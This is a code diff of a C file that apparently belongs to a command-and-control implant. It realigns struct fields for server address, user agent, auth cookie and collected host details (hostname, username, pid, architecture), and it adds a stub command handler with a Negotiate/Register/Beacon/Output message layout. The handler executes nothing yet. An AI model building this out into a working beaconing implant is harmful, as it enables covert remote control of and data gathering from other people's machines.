@@ -3,34 +3,34 @@
 #include "log.h"
 
 struct {
-    CHAR* address;
-    INT port;
+    CHAR*   address;
+    INT     port;
 } http;
 
 struct {
-    CHAR* path;
-    CHAR* user_agent;
+    CHAR*   path;
+    CHAR*   user_agent;
 } transport;
 
 struct {
-    CHAR* cookie;
-    CHAR* keyword; 
+    CHAR*   cookie;
+    CHAR*   keyword; 
 } auth;
 
 struct {
-    INT status;
-    CHAR* format;
-    CHAR* buffer;
-    CHAR length[MAX_PATH];
-    DWORD size;
+    INT     status;
+    CHAR*   format;
+    CHAR*   buffer;
+    CHAR    length[MAX_PATH];
+    DWORD   size;
 } data;
 
 struct { 
-    CHAR hostname[MAX_PATH];
-    CHAR username[MAX_PATH];
-    DWORD pid;
-    CHAR* name;
-    CHAR arch[MAX_PATH];
+    CHAR    hostname[MAX_PATH];
+    CHAR    username[MAX_PATH];
+    DWORD   pid;
+    CHAR*   name;
+    CHAR    arch[MAX_PATH];
 } info;
 
 CHAR* encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
@@ -68,6 +68,38 @@ void package(CHAR* buffer) {
     } else {
         log_debug("Header set: %s\n", data.length);
     }
+}
+
+void process_command(CHAR* command, CHAR* input) {
+    CHAR* output = NULL;
+    INT hex_command = atoi(command);
+
+    log_debug("Command: %s", command);
+    log_debug("Hex value: 0x%x", hex_command);
+    log_debug("Input: %s", input);
+
+    goto send_output;
+    send_output:
+        /**
+         * Output data structure:
+         * 
+         *      Status      4       (INT)
+         *          0: Negotiate
+         *          1: Register
+         *          2: Beacon
+         *          3: Output
+         *      Key         16      (CHAR*)
+         *      Output      256     (CHAR*)
+        */
+
+        if (output != NULL) {
+            goto cleanup;
+        } else {
+            goto cleanup;
+        }
+    cleanup:
+        free(input);
+        free(output);
 }
 
 void agent_beacon() {
